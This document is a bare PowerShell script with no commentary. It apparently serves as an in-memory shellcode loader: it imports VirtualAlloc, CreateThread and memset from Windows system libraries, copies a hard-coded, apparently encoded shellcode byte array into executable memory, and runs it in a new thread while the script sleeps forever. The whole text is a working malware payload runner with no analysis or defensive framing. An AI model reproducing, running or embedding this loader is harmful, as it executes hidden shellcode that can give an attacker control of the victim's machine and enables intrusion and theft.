$Gi2N = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Gi2N -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xd0,0xd9,0x74,0x24,0xf4,0x5f,0xb8,0xe6,0x77,0x41,0xbc,0x31,0xc9,0xb1,0x58,0x31,0x47,0x1a,0x03,0x47,0x1a,0x83,0xc7,0x04,0xe2,0x13,0x8b,0xa9,0x3e,0xdb,0x74,0x2a,0x5f,0x52,0x91,0x1b,0x5f,0x00,0xd1,0x0c,0x6f,0x43,0xb7,0xa0,0x04,0x01,0x2c,0x32,0x68,0x8d,0x43,0xf3,0xc7,0xeb,0x6a,0x04,0x7b,0xcf,0xed,0x86,0x86,0x03,0xce,0xb7,0x48,0x56,0x0f,0xff,0xb5,0x9a,0x5d,0xa8,0xb2,0x08,0x72,0xdd,0x8f,0x90,0xf9,0xad,0x1e,0x90,0x1e,0x65,0x20,0xb1,0xb0,0xfd,0x7b,0x11,0x32,0xd1,0xf7,0x18,0x2c,0x36,0x3d,0xd3,0xc7,0x8c,0xc9,0xe2,0x01,0xdd,0x32,0x48,0x6c,0xd1,0xc0,0x91,0xa8,0xd6,0x3a,0xe4,0xc0,0x24,0xc6,0xfe,0x16,0x56,0x1c,0x8b,0x8c,0xf0,0xd7,0x2b,0x69,0x00,0x3b,0xad,0xfa,0x0e,0xf0,0xba,0xa5,0x12,0x07,0x6f,0xde,0x2f,0x8c,0x8e,0x31,0xa6,0xd6,0xb4,0x95,0xe2,0x8d,0xd5,0x8c,0x4e,0x63,0xea,0xcf,0x30,0xdc,0x4e,0x9b,0xdd,0x09,0xe3,0xc6,0x89,0xa3,0x9e,0x8c,0x49,0x54,0x17,0x04,0x24,0xcd,0x83,0xbe,0xf4,0x7a,0x0d,0x38,0xfa,0x50,0x60,0x9d,0x57,0x08,0xd1,0x72,0x0b,0xc6,0xef,0x22,0xd2,0xb1,0xf0,0x1e,0x77,0xed,0x64,0xa2,0x2b,0x42,0x10,0xff,0xda,0x64,0xe0,0x17,0x50,0x64,0xe0,0xe7,0x46,0x0c,0xa6,0xd7,0xad,0x86,0x26,0x48,0xa6,0x41,0xaf,0xf7,0xf0,0x91,0x7a,0x8e,0x3b,0x3e,0xec,0x91,0xf1,0x21,0x68,0xc2,0xa6,0xf2,0x27,0xb6,0x1e,0x9d,0x2c,0x6d,0xb1,0x66,0x4d,0x5b,0x5b,0xf2,0xbb,0x3b,0x0c,0x83,0x88,0xc3,0xcc,0x0a,0x0e,0xa9,0xc8,0x5c,0xa4,0x31,0x87,0x34,0x4d,0x08,0xb9,0x43,0x52,0x41,0x96,0x18,0xff,0x39,0x4f,0xf7,0xd2,0xbb,0x77,0x7c,0xd3,0x11,0x02,0x42,0x5e,0x90,0x42,0x36,0x79,0xcc,0xac,0x0d,0xdb,0x5b,0xb2,0xbb,0x71,0x24,0x24,0x44,0x95,0xa4,0xb4,0x2c,0x95,0xa4,0xf4,0xac,0xc6,0xcc,0xac,0x08,0xbb,0xe9,0xb2,0x84,0xa8,0xa1,0x1f,0xae,0x29,0x12,0xc8,0xb0,0x95,0x9d,0x08,0xe2,0x83,0xf5,0x1a,0x92,0xa2,0xe4,0xe4,0x4f,0x31,0x28,0x6e,0xbd,0xb2,0xae,0x8e,0xfe,0x41,0x70,0xe5,0xe5,0x11,0xb2,0x59,0x0e,0xd4,0xcb,0x99,0x31,0x61,0x43,0x11,0xfd,0xa3,0xc8,0xb5,0x73,0xd4,0x63,0x23,0x59,0x5f,0x0c,0x85,0xc5,0xfe,0x98,0xbc,0x05;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$G2qN=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($G2qN.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$G2qN,0,0,0);for (;;){Start-sleep 60};